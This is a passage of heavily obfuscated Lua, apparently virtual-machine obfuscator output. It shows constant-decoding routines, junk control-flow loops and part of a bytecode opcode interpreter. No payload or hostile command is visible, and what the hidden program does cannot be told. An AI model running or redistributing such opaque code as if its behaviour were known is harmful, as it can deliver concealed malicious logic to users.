end end end else if 4<de then break else return db end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if(cx>bw)then local bw=cw while true do bw=bw+cu if not(bw~=ct)then break else return by end end end else if 1<cs then cy=(((cy-bk))%bs)else cx=cx+cu end end else if cs<=3 then if((not((cy%bi)~=bj)or(cy%bi)>bj))then local bi=cw while true do bi=(bi+cu)if((bi==ct or bi>ct))then if((bi<bh))then return cc else break end else cy=(cy*bg)%be end end else local be=cw while true do be=((be+cu))if(be<ct)then return by(bz(ce and bz,(by and bz),(cc and by),by),(ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc)),(cc(ce,by and ce,by,ce)and bz(by,(by and by),cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if 5~=cs then return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,(by and by),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if(cx>bf)then local bf=cw while true do bf=(bf+cu)if bf<ct then return bj else break end end end else if 2>bk then cx=cx+cu else cy=((cy+y)%x)end end else if bk<=3 then if((((cy%v)>w)or not((cy%v)~=w)))then local v=cw while true do v=(v+cu)if((v<cu or v==cu))then cy=((((cy-ca))%s))else if not((v~=bh))then break else return bj end end end else local s=cw while true do s=(s+cu)if not(s~=ct)then break else return bi(be(bi,((be and bi)),bg,bj),(bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj)),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if 5>bk then return be(bi(bg and bj,bg,bg and be,(bj and bi)),bj(be,bi,bj,bi),bj((bj and bi),(bi and bi),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if cx>q then local q=cw while true do q=q+cu if(q<ct)then return x else break end end end else if 2~=y then cx=cx+cu else cy=(((cy*p))%d)end end else if y<=3 then if(((cy%c))>b)then local b=cw while true do b=(b+cu)if(b<ct)then return s(w(x,s,s,(v and w)),(s(s,w,v,(v and s))and x(v,x,x,v)),v(s,x,s,((w and s))),(w(s,w,s,w)and s(v,w,s,(s and x))))else break end end else local b=cw while true do b=(b+cu)if not(b~=ct)then break else return v end end end else if y>4 then break else return x end end end y=y+1 end end)else if 31<a then break else return cy;end end end end end end a=a+1 end end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a>0 then if b==0 and c==0 then return 0;end;else b,c=cf(),cf()end else if a<3 then d=1 else p=((cd(c,1,20)*((2^32)))+b)end end else if a<=5 then if a<5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if((q==0))then if((p==0))then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(not(p~=0))then return s*((1/0));else return s*(0/0);end;end;else if 8>a then return(s*2^(q-1023)*((d+(p/(2^52)))))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd<31 then cm=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 4~=a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd<33 then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 2>a then c=157 else d=0 end end else if a<=3 then p={}else if 4<a then break else while d<8 do d=(d+1);while d<707 and c%1622<811 do c=(((c*35)))local q=d+c if((((c%16522))<8261))then c=(c*19)while((d<828)and c%658<329)do c=(((c+60)))local q=(d+c)if(((((c%18428))==9214)or((c%18428))<9214))then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,(br+q-1));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif(not(c%4==0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if(v~=1)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=((c*88))d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if 1>v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=((d+1));end elseif not(c%4==0)then c=(c-48)while(((d<859)and c%1392<696))do c=(c*39)local q=((d+c))if(c%58)<29 then c=((c+5))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(c%4==0)then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end else c=(((c*9)))d=d+1 local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(1==v)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end end;d=d+1;end else c=((c-51))d=((d+1))while((d<663)and((c%936)<468))do c=(((c*12)))local q=((d+c))if((((c%18532))==9266 or((c%18532))>9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not((c%4)~=0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(1==v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*35)d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 1<p then break else while true do if q==0 then return i(h(b))else break end q=(q+1)end end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=((c-494))if(d>43)then break;end;end;end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if 1>a then return{...},n("\35",...)else break end a=a+1 end end else if 35<bd then break else cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if 3<a then w=0 else v=490 end end end else if a<=6 then if 6~=a then x={}else while(w<3)do w=((w+1));while(w<481 and v%320<160)do v=((v*62))local d=(w+v)if(v%916)>458 then v=(((v-88)))while((w<318))and v%702<351 do v=(((v*8)))local d=((w+v))if(v%14064)>7032 then v=(v*81)local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=(v*37)local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(v+10)w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==2)))then s[d]=nil;elseif(not((j~=3)))then s[d]=(not(cg()==0));elseif((not(j~=1)))then s[d]=ck();elseif(not((j~=0)))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not((v%4)==0)then v=((v*65))while(w<615 and v%618<309)do v=((v-33))local d=w+v if((((v%15582))>7791))then v=(((v*14)))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=((w+1))local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=(v+7)w=(w+1)while((w<127 and v%1548<774))do v=(v-37)local d=((w+v))if((v%19188)>9594)then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=((v+25))local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=(v*482)if w>56 then break;end;end;end else if a<=7 then for d=1,cf()do c[(d-1)]=cr();end;else if a~=9 then v=958 else w=0 end end end end else if a<=14 then if a<=11 then if 10==a then x={}else while((w<4))do w=((w+1));while(w<934 and(v%1378<689))do v=(v-80)local c=w+v if(v%14274)<7137 then v=((v+68))while((w<987 and v%1768<884))do v=(v*31)local c=w+v if((v%6306)>3153 or(v%6306)==3153)then v=(v*37)local c=24134 if not x[c]then x[c]=1;end elseif not((v%4)==0)then v=(((v*48)))local c=52916 if not x[c]then x[c]=1;end else v=(((v-16)))w=(w+1)local c=76613 if not x[c]then x[c]=1;end end;w=(w+1);end elseif v%4~=0 then v=((v-79))while((w<96)and(((v%30)<15)))do v=(((v-40)))local c=((w+v))if(((v%18308))>9154)then v=(v*81)local c=46619 if not x[c]then x[c]=1;end elseif(not((v%4)==0))then v=((v+30))local c=41298 if not x[c]then x[c]=1;end else v=(((v*10)))w=((w+1))local c=53853 if not x[c]then x[c]=1;end end;w=w+1;end else v=(((v-68)))w=w+1 while(w<412 and(v%804)<402)do v=(v*8)local c=((w+v))if((((v%4202))==2101 or((v%4202))<2101))then v=((v*65))local c=24875 if not x[c]then x[c]=1;end elseif not(not(v%4~=0))then v=(v-62)local c=23890 if not x[c]then x[c]=1;end else v=((v+23))w=((w+1))local c=90205 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if(not(bb~=0))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[370]=cm(),[134]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if((not((y~=0)))or((y==c)))then be[652]=cf();if(not(not(y==0)))then be[76]=cf();end;elseif((not(y~=d))or(y==j))then be[652]=(cf()-(e));if(not(y~=j))then be[76]=cm();end;end;if((not(cd(bb,c,c)~=c)))then be[134]=s[be[134]];end;if(not(not(cd(bb,d,d)==c)))then be[652]=s[be[652]];end;if(not(not((cd(bb,j,j)==c))))then be[76]=s[be[76]];end;b[p]=be;end;end;end end;w=((w+1));end end;w=(w+1);end v=((v-963))if(w>64)then break;end;end;end else if a<=12 then q[481]=cg();else if 14>a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[134],b[652],b[76]if not(not(not(bp(c)~=f)))then c=z(c,cl,function(j,p)local p,s=0 while true do if p<=0 then s=0 else if p<2 then while true do if s<1 then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[134]=c end if not(not(bp(d)==f))then d=z(d,cl,function(c,j,j,j,j)local j,p=0 while true do if j<=0 then p=0 else if j~=2 then while true do if p~=1 then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[652]=d end if not((not(bp(e)==f)))then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if d<2 then while true do if j<1 then return i(bu(h(c),cb))else break end j=(j+1)end else break end end d=d+1 end end)b[76]=e end;end;q[cj]=nil;end;else v=214 end end end else if a<=16 then if 15==a then w=0 else x={}end else if a<=17 then while(w<7)do w=((w+1));while((w<764 and(((v%374)<187))))do v=((v*56))local b=(w+v)if(((v%436)<218))then v=(v*30)while((w<237 and v%1094<547))do v=(v-11)local b=((w+v))if((v%152)>76)then v=((v+87))local b=72820 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=((v*82))local b=57293 if not x[b]then x[b]=1;return q end else v=((v-28))w=(w+1)local b=94002 if not x[b]then x[b]=1;return q end end;w=w+1;end elseif not(not((v%4)~=0))then v=((v-76))while((w<187 and(((v%1974)<987))))do v=((v*31))local b=(w+v)if(v%18064)>9032 then v=((v-44))local b=1827 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=((v*6))local b=81586 if not x[b]then x[b]=1;return q end else v=(((v+1)))w=(w+1)local b=77306 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=((v+36))w=((w+1))while((w<206 and v%1970<985))do v=((v+73))local b=w+v if((v%12682))>6341 then v=((v-44))local b=37355 if not x[b]then x[b]=1;return q end elseif not((v%4)==0)then v=((v-61))local b=25812 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 2~=b then while true do if(c<=2)then if c<=0 then d=n(1,...)else if not(c==2)then e=({...})else do for d=0,#e do if(not(bp(e[d])~=bq))then for i,i in o,e[d]do if not(bp(i)~=bp(g))then t(bo,i)end end else t(bo,e[d])end end end end end else if c<=3 then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i==1 then while true do if(j<1 or j==1)then if j>0 then for s=0,#bo do if ba(d,bo[s])then return bm(f);end end else p=u(d)end else if(j~=3)then return false else break end end j=(j+1)end else break end end i=i+1 end end else if not(5==c)then for d=0,#e do if not(not(bp(e[d])==bq))then return h(e[d])end end else break end end end c=(c+1)end else break end end b=b+1 end end end else v=((v-30))w=(w+1)local b=22991 if not x[b]then x[b]=1;return q end end;w=w+1;end end;w=((w+1));end v=(((v-162)))if(w>41)then break;end;end;else if 18==a then return q;else break end end end end end a=a+1 end end end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[370];if 188>=z then if 93>=z then if z<=46 then if 22>=z then if 10>=z then if z<=4 then if(1>=z)then if not(1==z)then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then w[y[134]][y[652]]=y[76];else n=n+1;end else if ba<=2 then y=f[n];else if ba>3 then n=n+1;else w[y[134]]={};end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[134]][y[652]]=w[y[76]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[134]]=h[y[652]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[134]]=w[y[652]][y[76]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba>15 then n=n+1;else w[y[134]][y[652]]=w[y[76]];end else if ba<=17 then y=f[n];else if 18<ba then break else w[y[134]][y[652]]=w[y[76]];end end end end end ba=ba+1 end else w[y[134]][y[652]]=y[76];end;elseif z<=2 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[134]]=w[y[652]][y[76]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[134]]=y[652];else n=n+1;end else if ba~=7 then y=f[n];else w[y[134]]=y[652];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 11~=ba then w[y[134]]=y[652];else n=n+1;end end else if ba<=13 then if 12<ba then bb=y[134]else y=f[n];end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[652]))end end end end ba=ba+1 end elseif(z~=4)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[134]]=j[y[652]];end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[134]]=w[y[652]][y[76]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[134]end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[76]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 2>ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if ba~=4 then y=f[n];else w[y[134]]=h[y[652]];end else if ba~=6 then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 8>ba then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if 9==ba then y=f[n];else w[y[134]]=h[y[652]];end end else if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if 14>ba then w[y[134]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if ba~=17 then w[y[134]]={};else n=n+1;end end else if ba<=19 then if 18<ba then w[y[134]][y[652]]=w[y[76]];else y=f[n];end else if 21~=ba then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if 23>ba then w[y[134]]=j[y[652]];else n=n+1;end else if ba>24 then w[y[134]]=w[y[652]][y[76]];else y=f[n];end end else if ba<=27 then if ba==26 then n=n+1;else y=f[n];end else if 28==ba then if w[y[134]]then n=n+1;else n=y[652];end;else break end end end end end ba=ba+1 end end;elseif(z==7 or z<7)then if(5==z or 5>z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[134]]=j[y[652]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[134]]=w[y[652]][y[76]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[134]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[76]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z<7 then w[y[134]][y[652]]=w[y[76]];else local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then n=n+1;else w[y[134]][y[652]]=y[76];end else if ba<=2 then y=f[n];else if ba<4 then w[y[134]]={};else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[134]][y[652]]=w[y[76]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[134]]=h[y[652]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[134]]=w[y[652]][y[76]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then n=n+1;else w[y[134]][y[652]]=w[y[76]];end else if ba<=17 then y=f[n];else if 19>ba then w[y[134]][y[652]]=w[y[76]];else break end end end end end ba=ba+1 end end;elseif(8==z or 8>z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[134]]=w[y[652]][y[76]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[134]]=h[y[652]];else n=n+1;end else if ba<=6 then y=f[n];else if ba~=8 then w[y[134]]=w[y[652]][w[y[76]]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba>9 then w[y[134]]=h[y[652]];else y=f[n];end else if ba<=11 then n=n+1;else if ba>12 then w[y[134]]=w[y[652]][y[76]];else y=f[n];end end end else if ba<=15 then if ba~=15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[134]else if 17==ba then w[bb]=w[bb](r(w,bb+1,y[652]))else break end end end end end ba=ba+1 end elseif(9<z)then w[y[134]]();else local ba=y[134];p=ba+x-1;for bb=ba,p do local ba=q[(bb-ba)];w[bb]=ba;end;end;elseif z<=16 then if z<=13 then if 11>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[134]]=j[y[652]];else bb=nil end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if ba<=6 then y=f[n];else if 8~=ba then w[y[134]]=y[652];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[134]]=y[652];end else if ba<=11 then n=n+1;else if ba<13 then y=f[n];else w[y[134]]=y[652];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[134]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[652]))else break end end end end end ba=ba+1 end elseif 13~=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];ba=y[134]w[ba]=w[ba](r(w,ba+1,y[652]))else w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;end;elseif z<=14 then local ba=y[134];do return w[ba],w[ba+1]end elseif z~=16 then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;else local ba=y[134]w[ba]=w[ba](w[ba+1])end;elseif z<=19 then if 17>=z then if(w[y[134]]<=w[y[76]])then n=y[652];else n=n+1;end;elseif z~=19 then if w[y[134]]then n=n+1;else n=y[652];end;else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];n=y[652];end;elseif z<=20 then local ba=y[134];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;elseif z>21 then if(w[y[134]]<w[y[76]])then n=n+1;else n=y[652];end;else local ba;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];ba=y[134]w[ba]=w[ba](r(w,ba+1,y[652]))end;elseif z<=34 then if z<=28 then if 25>=z then if 23>=z then local ba,bb=0 while true do if ba<=17 then if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w={};else bb=nil end else if ba>2 then n=n+1;else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=5 then if 5~=ba then y=f[n];else w[y[134]]={};end else if ba<=6 then n=n+1;else if 8~=ba then y=f[n];else w[y[134]]=h[y[652]];end end end end else if ba<=12 then if ba<=10 then if 9==ba then n=n+1;else y=f[n];end else if 12~=ba then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end else if ba<=14 then if ba>13 then w[y[134]]=h[y[652]];else y=f[n];end else if ba<=15 then n=n+1;else if ba<17 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end end else if ba<=26 then if ba<=21 then if ba<=19 then if ba~=19 then n=n+1;else y=f[n];end else if 20==ba then w[y[134]]={};else n=n+1;end end else if ba<=23 then if 23~=ba then y=f[n];else w[y[134]]=y[652];end else if ba<=24 then n=n+1;else if ba==25 then y=f[n];else w[y[134]]=y[652];end end end end else if ba<=30 then if ba<=28 then if 28~=ba then n=n+1;else y=f[n];end else if ba>29 then n=n+1;else w[y[134]]=y[652];end end else if ba<=32 then if 32>ba then y=f[n];else bb=y[134];end else if ba<=33 then w[bb]=w[bb]-w[bb+2];else if ba<35 then n=y[652];else break end end end end end end ba=ba+1 end elseif z~=25 then w[y[134]][w[y[652]]]=w[y[76]];else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];for ba=y[134],y[652],1 do w[ba]=nil;end;n=n+1;y=f[n];n=y[652];end;elseif z<=26 then w[y[134]]=(w[y[652]]-y[76]);elseif z<28 then local ba;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];ba=y[134]w[ba]=w[ba](r(w,ba+1,y[652]))else local ba;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];ba=y[134]w[ba]=w[ba](w[ba+1])end;elseif 31>=z then if 29>=z then local ba=y[134];local bb=w[ba];for bc=ba+1,y[652]do t(bb,w[bc])end;elseif z<31 then local ba=y[134]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else local ba=y[134];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;end;elseif 32>=z then local q;local x;local ba;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end elseif z~=34 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end else w[y[134]]=h[y[652]];end;elseif 40>=z then if 37>=z then if z<=35 then local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end elseif z==36 then local q;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];q=y[134];do return w[q](r(w,q+1,y[652]))end;n=n+1;y=f[n];q=y[134];do return r(w,q,p)end;else w[y[134]]=true;end;elseif z<=38 then local q=y[134]local x,ba=i(w[q](r(w,q+1,y[652])))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;elseif 40~=z then local q=y[134];local x=w[q];for ba=q+1,y[652]do t(x,w[ba])end;else local q;local x;local ba;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];ba=y[134]x={w[ba](w[ba+1])};q=0;for bb=ba,y[76]do q=q+1;w[bb]=x[q];end end;elseif 43>=z then if 41>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1~=q then x=nil else ba=nil end else if q<=2 then bb=nil else if q<4 then w[y[134]]=h[y[652]];else n=n+1;end end end else if q<=6 then if q<6 then y=f[n];else w[y[134]]=h[y[652]];end else if q<=7 then n=n+1;else if 9>q then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end end end else if q<=14 then if q<=11 then if q>10 then y=f[n];else n=n+1;end else if q<=12 then w[y[134]]=w[y[652]][w[y[76]]];else if 13<q then y=f[n];else n=n+1;end end end else if q<=16 then if 16~=q then bb=y[134]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q>18 then break else for bc=bb,y[76]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end elseif 43>z then local q=y[134];local x=y[76];local ba=q+2;local bb={w[q](w[q+1],w[ba])};for bc=1,x do w[ba+bc]=bb[bc];end local q=w[q+3];if q then w[ba]=q;n=y[652];else n=n+1 end;else local q;local x;local 